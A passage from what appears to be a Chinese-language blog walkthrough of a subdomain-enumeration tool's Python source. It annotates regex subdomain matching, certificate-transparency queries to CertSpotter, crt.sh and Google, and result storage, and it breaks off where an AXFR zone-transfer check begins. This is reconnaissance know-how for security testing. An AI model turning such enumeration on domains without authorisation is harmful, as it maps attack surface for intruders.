class="hljs-literal">True</span></span>):</span><br>    <span class="hljs-comment"># 如果rsep为空 返回空</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 判断传入的resp是否是字符类型</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(resp, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-comment"># 跟进函数 返回的是根据页面text匹配出来的子域名</span><br>        <span class="hljs-keyword">return</span> utils.match_subdomains(self.domain, resp, distinct, fuzzy)<br>    <span class="hljs-comment"># 判断传入的resp 对象是否包含对应的属性</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(resp, <span class="hljs-string">&#x27;text&#x27;</span>):<br>        <span class="hljs-comment"># 跟进函数 返回的是根据页面text匹配出来的子域名</span><br>        <span class="hljs-keyword">return</span> utils.match_subdomains(self.domain, resp.text, distinct, fuzzy)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br></code></pre></div></td></tr></table></figure><h4 id="1-1-1-1-utils-match-subdomains"><a href="#1-1-1-1-utils-match-subdomains" class="headerlink" title="1.1.1.1 utils.match_subdomains"></a>1.1.1.1 utils.match_subdomains</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match_subdomains</span>(<span class="hljs-params">domain, html, distinct=<span class="hljs-literal">True</span>, fuzzy=<span class="hljs-literal">True</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Use regexp to match subdomains</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param  str domain: main domain</span><br><span class="hljs-string">    :param  str html: response html text</span><br><span class="hljs-string">    :param  bool distinct: deduplicate results or not (default True)</span><br><span class="hljs-string">    :param  bool fuzzy: fuzzy match subdomain or not (default True)</span><br><span class="hljs-string">    :return set/list: result set or list</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Use regexp to match subdomains in the response body&#x27;</span>)<br>    <span class="hljs-comment"># 从返回的内容中模糊匹配</span><br>    <span class="hljs-keyword">if</span> fuzzy:<br>        <span class="hljs-comment"># 匹配结尾是domain的形似域名的内容(ss(?:ss|aa)=(ssss|ssaa))</span><br>        regexp = <span class="hljs-string">r&#x27;(?:[a-z0-9](?:[a-z0-9\-]&#123;0,61&#125;[a-z0-9])?\.)&#123;0,&#125;&#x27;</span> \<br>                 + domain.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">r&#x27;\.&#x27;</span>)<br>        result = re.findall(regexp, html, re.I)<br>        <span class="hljs-comment"># 如果没匹配到结果 返回空</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br>        <span class="hljs-comment"># 能利用map函数及lambda(直接写在括号里的函数)实现遍历所有结果转为小写，以下内容中，s表示参数</span><br>        deal = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: s.lower(), result)<br>        <span class="hljs-comment"># 如果传入的distinct为True</span><br>        <span class="hljs-keyword">if</span> distinct:<br>            <span class="hljs-comment"># 返回 set类型</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(deal)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回 list类型</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(deal)<br>    <span class="hljs-comment"># 如果不开启模糊匹配</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 相较于之前的模糊匹配，前面增加了&gt;,&quot;,&#x27;,=,,和http://,https://的匹配</span><br>        regexp = <span class="hljs-string">r&#x27;(?:\&gt;|\&quot;|\&#x27;|\=|\,)(?:http\:\/\/|https\:\/\/)?&#x27;</span> \<br>                 <span class="hljs-string">r&#x27;(?:[a-z0-9](?:[a-z0-9\-]&#123;0,61&#125;[a-z0-9])?\.)&#123;0,&#125;&#x27;</span> \<br>                 + domain.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">r&#x27;\.&#x27;</span>)<br>        result = re.findall(regexp, html, re.I)<br>    <span class="hljs-comment"># 如果没有内容return 空</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br>    regexp = <span class="hljs-string">r&#x27;(?:http://|https://)&#x27;</span><br>    <span class="hljs-comment"># 利用map以及lambda实现只返回具体域名eg: =https://news.baidu.com 返回news.baidu.com</span><br>    deal = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: re.sub(regexp, <span class="hljs-string">&#x27;&#x27;</span>, s[<span class="hljs-number">1</span>:].lower()), result)<br>    <span class="hljs-comment"># 利用distinct返回对应的类型</span><br>    <span class="hljs-keyword">if</span> distinct:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(deal)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(deal)<br></code></pre></div></td></tr></table></figure><h2 id="1-2-certspotter"><a href="#1-2-certspotter" class="headerlink" title="1.2 certspotter"></a>1.2 certspotter</h2><p>整体结构与上一个类似</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CertSpotter</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        <span class="hljs-comment"># 初始化内容</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Certificate&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CertSpotterQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.certspotter.com/v1/issuances&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 以下内容基本等同与之前的内容</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;domain&#x27;</span>: self.domain,<br>                  <span class="hljs-string">&#x27;include_subdomains&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>                  <span class="hljs-string">&#x27;expand&#x27;</span>: <span class="hljs-string">&#x27;dns_names&#x27;</span>&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        类执行入口</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.begin()<br>        self.query()<br>        self.finish()<br>        <span class="hljs-comment"># 此处需要设置保存结果模式为json</span><br>        self.save_json()<br>        <span class="hljs-comment"># 跟进分析 </span><br>        self.gen_result()<br>        <span class="hljs-comment"># 跟进分析 </span><br>        self.save_db()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    类统一调用入口</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str domain: 域名</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    query = CertSpotter(domain)<br>    query.run()<br><br></code></pre></div></td></tr></table></figure><h3 id="1-2-1-gen-result"><a href="#1-2-1-gen-result" class="headerlink" title="1.2.1 gen_result"></a>1.2.1 gen_result</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def gen_result</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_result</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Generate results</span><br><span class="hljs-string">    构建结果表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Generating final results&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(self.subdomains):  <span class="hljs-comment"># 该模块一个子域都没有发现的情况</span><br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module result is empty&#x27;</span>)<br>        result = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;alive&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;request&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;resolve&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;subdomain&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;cname&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;public&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;cdn&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;reason&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;banner&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;history&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;response&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;ip_times&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;cname_times&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;ttl&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;cidr&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;asn&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;org&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;addr&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;isp&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;resolver&#x27;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&#x27;module&#x27;</span>: self.module,<br>                    <span class="hljs-string">&#x27;source&#x27;</span>: self.source,<br>                    <span class="hljs-string">&#x27;elapse&#x27;</span>: self.elapse,<br>                    <span class="hljs-string">&#x27;find&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br>        self.results.append(result)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 逐个存储子域名信息</span><br>        <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> self.subdomains:<br>            <span class="hljs-comment"># 基本设置</span><br>            url = <span class="hljs-string">&#x27;http://&#x27;</span> + subdomain<br>            <span class="hljs-comment"># 判断几级域名</span><br>            level = subdomain.count(<span class="hljs-string">&#x27;.&#x27;</span>) - self.domain.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>            <span class="hljs-comment"># 暂时分析的函数都是没有infos的内容的，暂缓</span><br>            info = self.infos.get(subdomain)<br>            <span class="hljs-keyword">if</span> info <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                info = <span class="hljs-built_in">dict</span>()<br>            <span class="hljs-comment"># 从info中获取信息</span><br>            cname = info.get(<span class="hljs-string">&#x27;cname&#x27;</span>)<br>            ip = info.get(<span class="hljs-string">&#x27;ip&#x27;</span>)<br>            ip_times = info.get(<span class="hljs-string">&#x27;ip_times&#x27;</span>)<br>            cname_times = info.get(<span class="hljs-string">&#x27;cname_times&#x27;</span>)<br>            ttl = info.get(<span class="hljs-string">&#x27;ttl&#x27;</span>)<br>            <span class="hljs-comment"># 判断cname是否是列表形式 并</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(cname, <span class="hljs-built_in">list</span>):<br>                <span class="hljs-comment"># 在列表中逐个添加,号</span><br>                cname = <span class="hljs-string">&#x27;,&#x27;</span>.join(cname)<br>                ip = <span class="hljs-string">&#x27;,&#x27;</span>.join(ip)<br>                ip_times = <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> ip_times])<br>                cname_times = <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> cname_times])<br>                ttl = <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> ttl])<br>            <span class="hljs-comment"># 构建result内容</span><br>            result = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;alive&#x27;</span>: info.get(<span class="hljs-string">&#x27;alive&#x27;</span>),<br>                        <span class="hljs-string">&#x27;request&#x27;</span>: info.get(<span class="hljs-string">&#x27;request&#x27;</span>),<br>                        <span class="hljs-string">&#x27;resolve&#x27;</span>: info.get(<span class="hljs-string">&#x27;resolve&#x27;</span>),<br>                        <span class="hljs-string">&#x27;url&#x27;</span>: url,<br>                        <span class="hljs-string">&#x27;subdomain&#x27;</span>: subdomain,<br>                        <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-number">80</span>,<br>                        <span class="hljs-string">&#x27;level&#x27;</span>: level,<br>                        <span class="hljs-string">&#x27;cname&#x27;</span>: cname,<br>                        <span class="hljs-string">&#x27;ip&#x27;</span>: ip,<br>                        <span class="hljs-string">&#x27;public&#x27;</span>: info.get(<span class="hljs-string">&#x27;public&#x27;</span>),<br>                        <span class="hljs-string">&#x27;cdn&#x27;</span>: info.get(<span class="hljs-string">&#x27;cdn&#x27;</span>),<br>                        <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;reason&#x27;</span>: info.get(<span class="hljs-string">&#x27;reason&#x27;</span>),<br>                        <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;banner&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;history&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;response&#x27;</span>: <span class="hljs-literal">None</span>,<br>                        <span class="hljs-string">&#x27;ip_times&#x27;</span>: ip_times,<br>                        <span class="hljs-string">&#x27;cname_times&#x27;</span>: cname_times,<br>                        <span class="hljs-string">&#x27;ttl&#x27;</span>: ttl,<br>                        <span class="hljs-string">&#x27;cidr&#x27;</span>: info.get(<span class="hljs-string">&#x27;cidr&#x27;</span>),<br>                        <span class="hljs-string">&#x27;asn&#x27;</span>: info.get(<span class="hljs-string">&#x27;asn&#x27;</span>),<br>                        <span class="hljs-string">&#x27;org&#x27;</span>: info.get(<span class="hljs-string">&#x27;org&#x27;</span>),<br>                        <span class="hljs-string">&#x27;addr&#x27;</span>: info.get(<span class="hljs-string">&#x27;addr&#x27;</span>),<br>                        <span class="hljs-string">&#x27;isp&#x27;</span>: info.get(<span class="hljs-string">&#x27;isp&#x27;</span>),<br>                        <span class="hljs-string">&#x27;resolver&#x27;</span>: info.get(<span class="hljs-string">&#x27;resolver&#x27;</span>),<br>                        <span class="hljs-string">&#x27;module&#x27;</span>: self.module,<br>                        <span class="hljs-string">&#x27;source&#x27;</span>: self.source,<br>                        <span class="hljs-string">&#x27;elapse&#x27;</span>: self.elapse,<br>                        <span class="hljs-string">&#x27;find&#x27;</span>: <span class="hljs-built_in">len</span>(self.subdomains)&#125;<br>            <span class="hljs-comment"># 添加到results列表中</span><br>            self.results.append(result)<br></code></pre></div></td></tr></table></figure><h3 id="1-2-2-save-db"><a href="#1-2-2-save-db" class="headerlink" title="1.2.2 save_db"></a>1.2.2 save_db</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def save_db</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_db</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Save module results into the database</span><br><span class="hljs-string">    # 保存模块结果到数据库</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Saving results to database&#x27;</span>)<br>    <span class="hljs-comment"># 线程锁</span><br>    lock.acquire()<br>    db = Database()<br>    db.create_table(self.domain)<br>    <span class="hljs-comment"># 保存信息 将传入的results构造对应的sql中插入语句插入</span><br>    db.save_db(self.domain, self.results, self.source)<br>    db.close()<br>    <span class="hljs-comment"># 锁释放</span><br>    lock.release()<br></code></pre></div></td></tr></table></figure><h2 id="1-3-crtsh"><a href="#1-3-crtsh" class="headerlink" title="1.3 crtsh"></a>1.3 crtsh</h2><p>类似之前的内容此处只简单介绍改变的函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crtsh</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Certificate&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CrtshQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://crt.sh/&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        <span class="hljs-comment"># 构造对应需要的请求</span><br>        params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">f&#x27;%.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;output&#x27;</span>: <span class="hljs-string">&#x27;json&#x27;</span>&#125;<br>        resp = self.get(self.addr, params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        text = resp.text.replace(<span class="hljs-string">r&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>        subdomains = self.match_subdomains(text)<br>        self.subdomains.update(subdomains)<br></code></pre></div></td></tr></table></figure><h2 id="1-4-google"><a href="#1-4-google" class="headerlink" title="1.4 google"></a>1.4 google</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 基本流程同上</span><br><span class="hljs-comment"># Class Google</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Google</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-comment"># 初始化参数</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Certificate&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;GoogleQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://transparencyreport.google.com/&#x27;</span> \<br>                    <span class="hljs-string">&#x27;transparencyreport/api/v3/httpsreport/ct/certsearch&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        <span class="hljs-comment"># 修改对应参数请求</span><br>        params = &#123;<span class="hljs-string">&#x27;include_expired&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>                  <span class="hljs-string">&#x27;include_subdomains&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>                  <span class="hljs-string">&#x27;domain&#x27;</span>: self.domain&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h1 id="2-check"><a href="#2-check" class="headerlink" title="2. check"></a>2. check</h1><h2 id="2-1-axfr"><a href="#2-1-axfr" class="headerlink" title="2.1 axfr"></a>2.1 axfr</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 